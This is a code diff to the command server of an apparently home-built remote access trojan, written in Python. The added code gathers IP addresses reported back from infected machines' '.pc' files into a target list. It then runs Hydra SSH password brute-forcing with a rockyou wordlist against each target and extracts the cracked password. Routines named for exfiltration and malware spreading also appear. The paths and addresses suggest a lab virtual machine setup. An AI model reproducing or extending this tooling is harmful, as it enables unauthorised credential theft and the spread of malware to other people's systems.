@@ -7,6 +7,8 @@ import base64
 import sys
 import time
 from datetime import datetime
+import subprocess
+import os
 
 
 
@@ -45,12 +47,44 @@ class SERVER:
         file.write(b64decoded_bytes)
         file.close()
 
-    def RunHydra(self):
-        fileList = os.listdir(".")
+    def ParsePCFiles(self):
+        allDiscoveredIPs = []
+        fileList = os.listdir(".") # find all files in folder
         for file in fileList:
-            if file.endswith(".pc"):
-                runHydra = False
+            if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
                 print ("Checking File: " + file)
+                with open(file, 'r') as thisFile:#open file
+                    for line in thisFile: # check lines
+                        if "Discovered IP address:" in line: #if we find a discovered IP address
+                            allDiscoveredIPs.append(line.strip()) #write to the list of discovered IP addresses
+
+        #print("Discovered IPS: " + str(allDiscoveredIPs))
+        #create file of target PCs
+        #check if IP is already on the list and only add them if it is not in list
+        existingIPAddresses = []
+
+        #create file
+        fileName = "targetPCs.txt"
+        targetFile = open(fileName,'a') 
+        targetFile.close()
+        
+        # open file and check IPs that are already there
+        with open(fileName, 'r') as f:
+            for line in f:
+                existingIPAddresses.append(line.strip())
+
+        #open file and append IP addresses that are not in file
+        with open(fileName, 'a') as f:
+            for i in range(len(allDiscoveredIPs)):
+                if allDiscoveredIPs[i] not in existingIPAddresses:
+                    f.write(allDiscoveredIPs[i] + '\n')
+
+    def RunHydra(self):
+        fileList = os.listdir(".") # find all files in folder
+        for file in fileList:
+            if file.endswith(".pc"): #if that file is a .pc file uploaded from malware
+                print ("Checking File: " + file)
+
                 with open(file) as thisFile:
                     for line in thisFile:
                         if 'password' in line or 'Hydra attempted:yes' in line:
@@ -65,8 +99,8 @@ class SERVER:
                     if runHydra == True:
                         print('run hydra on ' + str(thisFile.name))
                         thisFile.write('\n'+ "Hydra attempted:yes")
-                        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.115"],capture_output=True)
-                        print(hResult.stdout)
+                        hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', f"ssh://{targetIP}"],capture_output=True)
+                        #print(hResult.stdout)
                         #parse hydra data and write password to file
                         passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
                         password = str(hResult.stdout)[passIndex:]
@@ -79,7 +113,7 @@ class SERVER:
                         print('do NOT run hydra on ' + str(thisFile.name))    
 
 
-    def malSpread(self):
+    def MalSpread(self):
         # fileList = os.listdir(".")
         # for file in fileList:
         #     if file.endswith(".pc"):
@@ -268,7 +302,8 @@ rat = SERVER('0.0.0.0', 3312)
 
 if __name__ == '__main__':
     #rat.connection()
-    rat.CompromisedExfil()
-    rat.RunHydra()
-    rat.malSpread()
-    rat.mainloop()
+    #rat.CompromisedExfil()
+    rat.ParsePCFiles()
+    #rat.RunHydra()
+    #rat.MalSpread()
+    #rat.mainloop()
